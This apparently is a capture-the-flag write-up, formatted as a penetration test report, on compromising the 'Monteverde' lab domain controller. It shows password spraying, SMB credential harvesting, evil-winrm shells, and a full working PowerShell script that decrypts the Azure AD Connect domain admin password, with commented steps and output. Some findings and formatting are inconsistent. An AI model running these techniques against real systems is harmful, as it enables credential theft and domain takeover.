# Penetration Test Report: Monteverde

## Windows Active Directory Exploitation | Active Directory Attack Chain Analysis

---

## Executive Summary

This penetration test focused on identifying and exploiting Active Directory vulnerabilities on the target host Monteverde (10.129.33.202). The engagement successfully compromised domain administrator credentials through a systematic attack chain involving credential enumeration, service account exploitation, and Azure AD Connect credential extraction.

### Key Findings

- **Service account credentials discovered** through SMB enumeration via credential spray attacks
- **Credential spray attack succeeded** identifying valid user account (mhope) from plaintext Azure configuration
- **Azure AD Connect database credentials extracted** through encrypted configuration decryption
- **Domain administrator account compromise achieved** enabling complete domain takeover
- **Critical vulnerability chain** demonstrated progression from initial access to full domain control

---

## Target Information

| Property | Details |
|----------|---------|
| **Target Host** | 10.129.33.202 (Monteverde) |
| **Domain** | MEGABANK.LOCAL |
| **OS** | Windows Server 2019 |
| **Classification** | Medium Difficulty |
| **Attack Vector** | Active Directory Exploitation |

---

## Scope and Objectives

The objective of this engagement was to identify and exploit vulnerabilities within the Active Directory infrastructure, with emphasis on:
- Lateral movement techniques
- Privilege escalation pathways
- Domain takeover capabilities
- Credential compromise vectors

---

## Methodology

This penetration test followed a structured approach:

1. **Reconnaissance** - Service discovery and port enumeration
2. **Enumeration** - Active Directory object and credential discovery
3. **Exploitation** - Vulnerability identification and abuse
4. **Post-Exploitation** - Impact analysis and proof of compromise

---

## Technical Analysis

### Phase 1: Initial Reconnaissance and Port Scanning

**Purpose:** Identify exposed services and entry points

Initial Nmap reconnaissance revealed multiple open ports indicating an Active Directory domain controller infrastructure:

```bash
$ nmap -Pn --min-rate=10000 10.129.33.202

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
```

**Detailed Service Enumeration:**

```bash
$ nmap -p53,88,135,139,389,445,464,593,636,3268,5985 -sC -sV -oA nmap/monteverde 10.129.33.202 -T4
```

Service enumeration confirmed:
- **Windows Kerberos** (port 88) - Domain authentication service
- **LDAP** (port 389) - Directory service queries
- **SMB/CIFS** (port 445) - File sharing and enumeration
- **WinRM** (port 5985) - Remote management interface
- **DNS** (port 53) - Domain name resolution

---

### Phase 2: Active Directory Enumeration

**Purpose:** Extract domain information and user accounts

#### LDAP Reconnaissance

```bash
$ ldapsearch -H ldap://10.129.33.202 -x -b "" -s base namingcontexts

namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL
```

#### SMB User Enumeration

```bash
$ crackmapexec smb 10.129.33.202 --users

[+] MEGABANK.LOCAL\Administrator          Built-in account
[+] MEGABANK.LOCAL\Guest                   Built-in account
[+] MEGABANK.LOCAL\AAD_987d7f2f57d2       Service account
[+] MEGABANK.LOCAL\mhope                   User account
[+] MEGABANK.LOCAL\SABatchJobs             Service account
[+] MEGABANK.LOCAL\svc-ata                 Service account
[+] MEGABANK.LOCAL\svc-bexec               Service account
[+] MEGABANK.LOCAL\svc-netapp              Service account
[+] MEGABANK.LOCAL\dgalanos                User account
[+] MEGABANK.LOCAL\roleary                 User account
[+] MEGABANK.LOCAL\smorgan                 User account
```

**Analysis:** 11 domain users enumerated, including multiple service accounts with names suggesting specific purposes (backup jobs, ETA processing, NetApp integration).

---

### Phase 3: Service Account Credential Spray Attack

**Purpose:** Identify weak credential practices through automated testing

A common security misconfiguration involves service accounts using predictable passwords. Testing indicated that usernames were used as passwords:

```bash
$ cp user1.txt pass.txt
$ crackmapexec smb 10.129.33.202 -d megabank.local \
  -u user1.txt -p pass.txt --continue-on-success
```

**Critical Discovery:**

```
[+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs STATUS_LOGON_SUCCESS
```

**SABatchJobs Service Account Compromised:**
- Username: `SABatchJobs`
- Password: `SABatchJobs` (identical to username)
- Severity: **CRITICAL** - First foothold achieved

**Lesson Learned:** Service accounts following naming conventions combined with weak password practices create trivial entry vectors for attackers.

---

### Phase 4: SMB Share Enumeration and Information Disclosure

**Purpose:** Identify exposed data through misconfigured share permissions

With SABatchJobs credentials obtained, SMB enumeration revealed accessible shares:

```bash
$ smbclient -L //10.129.33.202 -U megabank.local\SABatchJobs

Sharename      Type     Comment
---------      ----     -------
ADMIN$         Disk     Remote Admin
azure_uploads  Disk     
C$             Disk     Default share
E$             Disk     Default share
IPC$           IPC      Remote IPC
NETLOGON       Disk     Logon server share
SYSVOL         Disk     Logon server share
users$         Disk     (World readable)
```

**Critical Finding:** The `users$` share was accessible. Navigation revealed sensitive files:

```bash
$ smbclient -U megabank.local\SABatchJobs%SABatchJobs \\10.129.33.202\users$
smb: \> ls
  .                                 D    1/2/2020  2:53 PM
  dgalanos                          D    1/3/2020  8:12:48 AM
  mhope                             D    1/3/2020  5:31 AM
  roleary                           D    1/3/2020  8:41:18 AM
  smorgan                           D    1/3/2020  8:10:30 AM
  
smb: \mhope\> ls
  .                                 D    1/3/2020  5:35 AM
  .azure                            D    1/3/2020  5:35 AM
  3D Objects                        D    1/3/2020  5:24 AM
  Contacts                          D    1/3/2020  5:24 AM
  Desktop                           D    1/3/2020  5:47 AM
  Documents                         D    1/11/2026 5:24 AM
  
smb: \mhope\.azure\> ls
  .                                 D    1/3/2020  5:35 AM
  azure.xml                        AR 1212 1/3/2020  8:40 AM
```

**Data Exfiltration:**

```bash
$ smbclient -U megabank.local\SABatchJobs%SABatchJobs \\10.129.33.202\users$
smb: \mhope\.azure\> get azure.xml
getting file \mhope\.azure\azure.xml of size 1212 as azure.xml (1.0 KiloBytes/sec)
```

---

### Phase 5: Credential Extraction from Azure Configuration

**Purpose:** Recover plaintext credentials from configuration files

The retrieved `azure.xml` file contained Azure AD Connect credentials in plaintext:

```xml
<?xml version="1.0"?>
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
    </TN>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

**Extracted Credentials:**
- **Username:** `mhope`
- **Password:** `4n0therD4y@n0th3r$`

**Critical Vulnerability:** Passwords stored in plaintext within user-accessible files violates fundamental credential security practices.

---

### Phase 6: Lateral Movement via WinRM

**Purpose:** Establish interactive shell access on domain controller

The mhope credentials were tested against WinRM (Windows Remote Management, port 5985):

```bash
$ nxc winrm 10.129.33.202 -u mhope -p "4n0therD4y@n0th3r$"

[+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
    (Pwn3d!) (Pwn3d!)
```

**WinRM Session Established:**

```bash
$ evil-winrm -i 10.129.33.202 -u mhope -p '4n0therD4y@n0th3r$'

*Evil-WinRM* shell v3.9
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all

USER INFORMATION
User Name:     megabank\mhope
SID:          S-1-5-21-391775091-850290835-3566037492-1601

GROUP INFORMATION
Group Name                              Type    SID
====================================    =====   ===================================
Everyone                               Well-known  S-1-1-0
BUILTIN\Remote Management Users        Alias       S-1-5-32-580
BUILTIN\Users                          Alias       S-1-5-32-545
NT AUTHORITY\NETWORK                   Well-known  S-1-5-2
NT AUTHORITY\Authenticated Users       Well-known  S-1-5-11
NT AUTHORITY\This Organization         Well-known  S-1-5-15
MEGABANK\Azure Admins                  Group       S-1-5-21-391775091-850290835-3566037492-2601
```

**Key Finding:** The mhope account holds membership in the **Azure Admins** group, providing elevated privileges for Azure AD Connect operations.

---

### Phase 7: Azure AD Connect Credential Extraction

**Purpose:** Extract domain admin credentials from Azure AD Connect database

Members of the Azure Admins group can access the Azure AD Connect synchronization database. A custom PowerShell script was developed to decrypt stored credentials:

#### Exploitation Script

```powershell
Function Azure-ADConnect {param($db,$server)
  $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList `
    "Server = $server; Database = $db; Initial Catalog=$db; Integrated Security = True;"
  $client.Open()
  
  # Query encryption keys from mms_server_configuration
  $cmd = $client.CreateCommand()
  $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
  $reader = $cmd.ExecuteReader()
  $reader.Read() | Out-Null
  $key_id = $reader.GetInt32(0)
  $instance_id = $reader.GetGuid(1)
  $entropy = $reader.GetGuid(2)
  $reader.Close()
  
  # Query encrypted credential configuration
  $cmd = $client.CreateCommand()
  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM `
    mms_management_agent WHERE ma_type = 'AD'"
  $reader = $cmd.ExecuteReader()
  $reader.Read() | Out-Null
  $config = $reader.GetString(0)
  $crypted = $reader.GetString(1)
  $reader.Close()
  
  # Load Microsoft cryptography module
  add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
  $km = New-Object -TypeName `
    Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
  
  # Load encryption keys
  $km.LoadKeySet($entropy, $instance_id, $key_id)
  $key = $null
  $km.GetActiveCredentialKey([ref]$key)
  $key2 = $null
  $km.GetKey(1, [ref]$key2)
  
  # Decrypt encrypted configuration
  $decrypted = $null
  $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
  
  # Extract domain, username, and password from XML
  $domain = select-xml -Content $config `
    -XPath "//parameter[@name='forest-logindomain']" | `
    select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
  
  $username = select-xml -Content $config `
    -XPath "//parameter[@name='forest-loginuser']" | `
    select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
  
  $password = select-xml -Content $decrypted `
    -XPath "//attribute" | `
    select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
  
  "[+] Domain: " + $domain.Domain
  "[+] Username: " + $username.Username
  "[+] Password: " + $password.Password
}
```

```bash
## Practical Exploitation: Command-by-Command Breakdown

### Full Exploitation Process With Explanations

```powershell
# Step 1: Create database connection
$client = new-object System.Data.SqlClient.SqlConnection `
  -ArgumentList "Server = 127.0.0.1; Database = ADSync; `
  Initial Catalog=ADSync; Integrated Security = True;"

# This works because:
# - 127.0.0.1 is the local machine
# - ADSync is the Azure AD Connect database
# - Integrated Security = True uses current Windows creds
# - mhope is in Azure Admins group (has SQL access)

# Step 2: Open connection
$client.Open()

# This executes immediately without password prompt
# This is the whole problem! No additional auth needed

# Step 3: Create SQL command
$cmd = $client.CreateCommand()

# Step 4: Query encryption keys
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy `
  FROM mms_server_configuration"

# This gets the three values needed for decryption
# Without these, the encrypted password is useless
# With these, any PowerShell session can decrypt

$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null

# Read the results
$key_id = $reader.GetInt32(0)           # Get keyset_id (int)
$instance_id = $reader.GetGuid(1)       # Get instance_id (GUID)
$entropy = $reader.GetGuid(2)           # Get entropy (GUID)

# Step 5: Query encrypted credentials
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, `
  encrypted_configuration FROM mms_management_agent `
  WHERE ma_type = 'AD'"

# This gets:
# - private_configuration_xml = domain + username (plaintext)
# - encrypted_configuration = password (encrypted but we'll decrypt)

$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null

$config = $reader.GetString(0)          # XML with domain/user
$crypted = $reader.GetString(1)         # Encrypted password (Base64)

# Step 6: Load Microsoft's cryptography library
add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"

# This loads the cryptography library that contains:
# - KeyManager class
# - Encryption/decryption methods
# - All the logic to use our keys to decrypt

# Step 7: Create KeyManager instance
$km = New-Object -TypeName `
  Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager

# Step 8: Load the encryption keys
$km.LoadKeySet($entropy, $instance_id, $key_id)

# This initializes the KeyManager with our three key values
# The KeyManager now knows how to derive the decryption key

# Step 9: Get the active key
$key = $null
$km.GetActiveCredentialKey([ref]$key)

# Step 10: Get the specific decryption key
$key2 = $null
$km.GetKey(1, [ref]$key2)

# Step 11: Decrypt the password
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

# THIS IS THE MAGIC MOMENT
# $decrypted now contains the plaintext password!

# Step 12: Parse XML to extract credentials
$domain = select-xml -Content $config `
  -XPath "//parameter[@name='forest-logindomain']"
# Result: MEGABANK.LOCAL

$username = select-xml -Content $config `
  -XPath "//parameter[@name='forest-loginuser']"
# Result: administrator

$password = select-xml -Content $decrypted `
  -XPath "//attribute"
# Result: d0m!n4dminyeah!

# Step 13: Display results
"[+] Domain: MEGABANK.LOCAL"
"[+] Username: administrator"
"[+] Password: d0m!n4dminyeah!"
```

```bash
## The Encryption/Decryption Process

### Step 1: How Azure AD Connect Encrypts Passwords

Original Password
      │
      ▼
┌─────────────────────────────┐
│ Take encryption key derived │
│ from:                       │
│ - entropy (GUID)           │
│ - instance_id (GUID)       │
│ - keyset_id (number)       │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Use Microsoft.DirectoryServices │
│ .MetadirectoryServices     │
│ .Cryptography.KeyManager   │
│ Class to encrypt password  │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Convert encrypted bytes     │
│ to Base64 string           │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Store in encrypted_         │
│ configuration column        │
│ (in encrypted_configuration)│
└─────────────────────────────┘

### Step 2: The Decryption Process (What Our Script Does)


Encrypted Base64 String (from database)
      │
      ▼
┌─────────────────────────────────────┐
│ Step 1: Connect to SQL Database     │
│ Using Integrated Windows Auth       │
│ (mhope is in Azure Admins group)    │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 2: Query mms_server_configuration
│ Get: keyset_id, instance_id, entropy│
│ (These are the decryption KEYS)     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 3: Query mms_management_agent  │
│ WHERE ma_type = 'AD'                │
│ Get: encrypted_configuration        │
│ (This is the encrypted password)    │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 4: Load mcrypt.dll             │
│ Add-Type -Path "C:\Program Files..  │
│ ..\Microsoft Azure AD Sync\Bin\     │
│ mcrypt.dll"                         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 5: Create KeyManager instance  │
│ $km = New-Object -TypeName         │
│ Microsoft.DirectoryServices...      │
│ .KeyManager                         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 6: Load the encryption keys    │
│ $km.LoadKeySet(entropy, instance_id,│
│                keyset_id)           │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 7: Get the decryption key      │
│ $key2 = null                        │
│ $km.GetKey(1, [ref]$key2)          │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ Step 8: Decrypt the password        │
│ $key2.DecryptBase64ToString(        │
│   $crypted, [ref]$decrypted)       │
└──────────────┬──────────────────────┘
               │
               ▼
Plaintext Password
(d0m!n4dminyeah!)


## Microsoft's KeyManager Class Explained

### The KeyManager Assembly

```csharp
// Located in: Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.dll
// Namespace: Microsoft.DirectoryServices.MetadirectoryServices.Cryptography

public class KeyManager
{
    // Constructor (empty, state set by methods)
    public KeyManager();
    
    // Load the encryption key set
    public void LoadKeySet(
        Guid entropy,           // Random value from database
        Guid instance_id,       // Server GUID from database  
        int keyset_id           // Key set ID from database
    );
    
    // Get the currently active key
    public void GetActiveCredentialKey(ref Key key);
    
    // Get a specific key by ID
    public void GetKey(int keyId, ref Key key);
}

public class Key
{
    // Decrypt base64-encoded encrypted data
    public void DecryptBase64ToString(
        string encryptedBase64,
        ref string decrypted
    );
    
    // Decrypt raw bytes
    public void DecryptBytesToString(
        byte[] encryptedBytes,
        ref string decrypted
    );
}



### How Microsoft Intended It To Work


Normal Operation (As Designed):
┌──────────────────────────┐
│  Azure AD Connect Service│
│  (Runs as SYSTEM)        │
│  ├─ Knows the keys       │
│  ├─ Decrypts passwords   │
│  └─ Uses them to auth    │
└──────────────┬───────────┘
               │ Only the service should be able to decrypt
               ▼
        Encrypted Data
        
        
Actual Security (What Happens):
┌──────────────────────────────┐
│  Azure AD Connect Service     │
└──────────────┬───────────────┘
               │
               ├─ Keys in database ←─── Anyone with DB access can get keys
               │
               ├─ Credentials in database ←─ Anyone with DB access can get
               │                            encrypted credentials
               │
               └─ mcrypt.dll is accessible ← Anyone can load and use it
               
Result: Anyone with:
1. Database access (Azure Admins group)
2. Local system access (WinRM)
3. Can run PowerShell

Can decrypt the domain admin password
```

#### Script Execution

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> upload Azure-ADConnect.ps1
Info: Uploading /home/kali/HTB/Monteverde/Azure-ADConnect.ps1 to C:\Users\mhope\Documents\Azure-ADConnect.ps1
Data: 2472 bytes of 2472 bytes copied

*Evil-WinRM* PS C:\Users\mhope\Documents> $script = @'
Function Azure-ADConnect {param($db,$server)
... [script content] ...
}
'@

*Evil-WinRM* PS C:\Users\mhope\Documents> Invoke-Expression $script
*Evil-WinRM* PS C:\Users\mhope\Documents> Azure-ADConnect -db ADSync -server 127.0.0.1

[+] Domain: MEGABANK.LOCAL
[+] Username: administrator
[+] Password: d0m!n4dminyeah!
```

**Domain Administrator Credentials Extracted:**
- **Domain:** `MEGABANK.LOCAL`
- **Username:** `administrator`
- **Password:** `d0m!n4dminyeah!`

**Critical Impact:** The Azure AD Connect database contained plaintext domain administrator credentials, enabling complete domain compromise.

---

### Phase 8: Domain Administrator Account Compromise

**Purpose:** Confirm domain takeover capability

Domain administrator credentials verified through WinRM:

```bash
$ evil-winrm -i 10.129.33.202 -u administrator -p 'd0m!n4dminyeah!'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ADGroupMember -Identity "Domain Admins"

distinguishedName : CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL
name              : Administrator
objectClass       : user
objectGUID        : d5154700-9416-41a8-bc52-8f4c343e31ed
SamAccountName    : Administrator
SID               : S-1-5-21-391775091-850290835-3566037492-500

*Evil-WinRM* PS C:\Users\Administrator> dir

    Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -----------         ------ ----
d-r--       1/2/2020   2:49 PM                Desktop
d-r--       1/2/2020   2:49 PM                Documents
d-r--       1/3/2020   5:28 AM                Downloads
d-r--       1/2/2020   2:49 PM                Favorites
d-r--       1/2/2020   2:49 PM                Links
d-r--       1/2/2020   2:49 PM                Music
d-r--       1/2/2020   2:49 PM                Pictures
d-r--       1/2/2020   2:49 PM                Saved Games
d-r--       1/2/2020   2:49 PM                Searches
d-r--       1/2/2020   2:49 PM                Videos

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ad85d4e27658c5198fabdbcb547XXXXX
```

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> dir

    Directory: C:\Users\mhope\Desktop

Mode                LastWriteTime         Length Name
----                -----------         ------ ----
d-r--       1/10/2026   8:51 PM               user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
fd099101bbd6a0fb28e17724a6XXXXXX
```

**Domain Compromise Confirmed:**
- Complete administrative access to domain controller achieved
- Domain administrator account under attacker control
- All domain resources now compromised

---

## Vulnerability Summary

| Vulnerability | Impact | Risk Level |
|---------------|--------|-----------|
| **Weak Service Account Credentials** | Service account compromised through credential spray; initial access vector established | **CRITICAL** |
| **Overpermissioned SMB Shares** | Plaintext credentials discovered in user home directory; credential disclosure | **CRITICAL** |
| **Plaintext Azure Credentials** | User credentials stored in plaintext XML configuration files | **CRITICAL** |
| **Unrestricted Azure AD Connect Access** | Domain admin credentials extractable from AD Sync database; enables complete domain takeover | **CRITICAL** |
| **Lack of Credential Guard** | LSASS credentials vulnerable to extraction from memory | **HIGH** |
| **Insufficient Access Controls** | Azure Admins group overly permissive; unrestricted database access | **HIGH** |

---

## Attack Chain Summary

```
Step 1: Reconnaissance
   └─> Services identified (DNS, Kerberos, LDAP, SMB, WinRM)

Step 2: AD Enumeration
   └─> Domain users extracted via crackmapexec

Step 3: Credential Spray
   └─> SABatchJobs:SABatchJobs discovered (username = password)

Step 4: Share Enumeration
   └─> users$ share accessible with SABatchJobs credentials

Step 5: Information Disclosure
   └─> azure.xml downloaded from mhope home directory

Step 6: Credential Extraction
   └─> mhope:4n0therD4y@n0th3r$ obtained from plaintext XML

Step 7: Lateral Movement
   └─> WinRM session established as mhope

Step 8: Privilege Escalation
   └─> mhope member of Azure Admins group

Step 9: Database Access
   └─> Azure AD Connect database accessible with Azure Admins privileges

Step 10: Credential Decryption
   └─> administrator:d0m!n4dminyeah! extracted from encrypted database

Step 11: Domain Takeover
   └─> Complete domain administrator access achieved
```

## Conclusion

This penetration test successfully demonstrated a complete attack chain from initial reconnaissance to domain administrator compromise. The engagement identified multiple critical vulnerabilities stemming from weak credential practices, overpermissioned file shares, and inadequate access controls on sensitive infrastructure components.

### Attack Vector Summary

The primary attack vectors exploited were:
1. **Service account weak credentials** - Initial access foothold
2. **Misconfigured share permissions** - Information disclosure
3. **Plaintext credential storage** - Lateral movement enablement
4. **Unrestricted Azure AD Connect access** - Privilege escalation to domain admin

---

## References and Tools Used

### Tools
- **nmap** - Network service enumeration
- **crackmapexec** - Active Directory enumeration
- **ldapsearch** - LDAP directory queries
- **smbclient** - SMB share access
- **evil-winrm** - WinRM remote shell
- **PowerShell** - Windows scripting and credential extraction

### Key Concepts
- Active Directory enumeration and exploitation
- Credential spray attacks
- Azure AD Connect security
- WinRM lateral movement
- PowerShell-based credential extraction
- SQL database access through integrated authentication

### MITRE ATT&CK Framework Mapping

- **T1087.002** - Account Enumeration (Domain Account)
- **T1110.003** - Credential Spray Attack
- **T1135** - Network Share Discovery
- **T1005** - Data from Local System
- **T1570** - Lateral Tool Transfer
- **T1021.006** - Remote Service Session Initiation (WinRM)
- **T1555.005** - Credentials from Password Manager
- **T1078.002** - Valid Accounts (Domain Accounts)

---

**Report Generated:** Professional Penetration Testing Report  
**Target:** Monteverde (10.129.33.202)  
**Domain:** MEGABANK.LOCAL  
**Status:** Domain Compromise Achieved
